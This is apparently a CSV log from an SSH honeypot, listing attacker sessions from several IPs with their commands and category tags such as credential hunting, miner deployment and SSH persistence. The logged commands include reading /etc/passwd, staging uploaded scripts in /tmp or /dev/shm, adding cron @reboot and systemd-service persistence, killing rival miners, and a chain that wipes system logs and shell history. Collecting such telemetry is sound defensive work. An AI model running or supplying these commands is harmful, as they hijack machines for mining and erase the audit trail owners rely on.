session_id,ip,username,mode,ssh_original_command,categories,malware_upload,malware_upload_reasons,termination_reason,created_files
1776546455_34.91.248.132_57452_sshshadow,34.91.248.132,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776546457_34.91.248.132_57452_sshshadow,34.91.248.132,deploy,non_interactive_exec,cat /etc/passwd,Data / credential hunting; GCS-aware discovery,False,,normal_exit,
1776546459_34.91.248.132_57452_sshshadow,34.91.248.132,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776546460_34.91.248.132_57452_sshshadow,34.91.248.132,deploy,non_interactive_exec,passwd,Data / credential hunting,False,,normal_exit,
1776546575_34.91.248.132_32774_sshshadow,34.91.248.132,ubuntu,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776546577_34.91.248.132_32774_sshshadow,34.91.248.132,ubuntu,non_interactive_exec,cat /etc/passwd,Data / credential hunting; GCS-aware discovery,False,,normal_exit,
1776546579_34.91.248.132_32774_sshshadow,34.91.248.132,ubuntu,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776546581_34.91.248.132_32774_sshshadow,34.91.248.132,ubuntu,non_interactive_exec,passwd,Data / credential hunting,False,,normal_exit,
1776546697_34.91.248.132_53512_sshshadow,34.91.248.132,test,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776546698_34.91.248.132_53512_sshshadow,34.91.248.132,test,non_interactive_exec,cat /etc/passwd,Data / credential hunting; GCS-aware discovery,False,,normal_exit,
1776546700_34.91.248.132_53512_sshshadow,34.91.248.132,test,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776546702_34.91.248.132_53512_sshshadow,34.91.248.132,test,non_interactive_exec,passwd,Data / credential hunting,False,,normal_exit,
1776548771_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,cut -d' ' -f1 /proc/uptime,,False,,,
1776548772_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,,
1776548773_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,"cd ""/tmp"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,,
1776548774_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,"PATH=$PATH:/usr/bin:/usr/local/bin CRON=""$(crontab -l 2>/dev/null || true)"" if ! echo ""$CRON"" | grep -F '/tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1; then (echo ""$CRON""; echo '@reboot /tmp/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""'; echo '0 * * * * cd ""/tmp"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""') | crontab - fi",Miner deployment; SSH persistence,False,,,
1776548775_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,ps aux | grep astats | grep -v grep |grep -v systemd-networkd |grep -v ld-musl-x86_64 |grep -v rsyslogd | wc -l,Generic recon; Miner deployment,False,,,
1776548776_86.38.24.97_21365_sshshadow,86.38.24.97,admin,,rm -rf .bash_history;rm -rf /var/run/utmp;rm -rf /var/run/wtmp -;rm -rf /var/log/lastlog;rm -rf /usr/adm/lastlog;rm -rf .bash_history;cd /home;rm -rf yum.log;cd /var/log/;rm -rf wtmp;rm -rf secure;rm -rf lastlog;rm -rf messages;touch messagess;touch wtmp;touch secure;touch lastlog;cd /root;rm -rf .bash_history;touch .bash_history;unset HISTFILE;unset HISTSAVE;history -n;unset WATCH;nohup sh /tmp/.ssh/b &;cd;HISTFILE=/dev/null;history -c && rm -f ~/.bash_history;cd ..,Data / credential hunting; SSH persistence,False,,,
1776551324_86.38.24.97_17195_sshshadow,86.38.24.97,admin,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776551326_86.38.24.97_17195_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776551328_86.38.24.97_17195_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776552653_86.38.24.201_28341_sshshadow,86.38.24.201,admin,,sudo -n true,,False,,exit_code_23,
1776552654_86.38.24.201_28341_sshshadow,86.38.24.201,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
1776552656_86.38.24.201_28341_sshshadow,86.38.24.201,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -type f -name 'kstats' -delete ; find . -type f -name 'c.lock' -delete; kill -9 $(ps aux | grep kproc | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep bstats | grep -v grep | awk '{print $2}') 2>/dev/null || true; kill -9 $(ps aux | grep istats | grep -v grep | awk '{print $2}') 2>/dev/null || true,Generic recon; Miner deployment,False,,normal_exit,
1776571898_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776571899_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776571901_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776571903_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776571905_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776571907_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776571909_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776571911_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776571912_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776571916_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776571919_86.38.24.97_61585_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776574320_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling,False,,normal_exit,
1776574322_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,False,,normal_exit,
1776574325_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,False,,normal_exit,
1776574327_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",File transfer / staging,True,script_upload_via_stdin_or_scp,normal_exit,
1776574328_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Miner deployment; SSH persistence,False,,exit_code_127,
1776574330_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',File transfer / staging; Miner deployment; SSH persistence,True,script_upload_via_stdin_or_scp,exit_code_127,
1776574332_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776574334_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,normal_exit,
1776574336_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,normal_exit,
1776574340_86.38.24.97_31449_sshshadow,86.38.24.97,admin,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges,Miner deployment,False,,exit_code_141,
1776574342_86.38.24.97_31449_sshshadow,86.38.24.97,admin,,ps aux | grep astats | grep -v grep | wc -l,Generic recon; Miner deployment,False,,exit_code_23,
1776579512_86.38.24.97_30307_sshshadow,86.38.24.97,admin,non_interactive_exec,sudo -n true,,False,,exit_code_127,
1776579514_86.38.24.97_30307_sshshadow,86.38.24.97,admin,non_interactive_exec,"sh -c ""pids=$(pgrep -af 'kstats' | grep -vE 'ssh|sshd|bash|sh|pkill|pgrep' | awk '{print $1}'); [ -n \""$pids\"" ] && kill -9 $pids || pkill -x 'kstats' || true""",Miner deployment,False,,normal_exit,
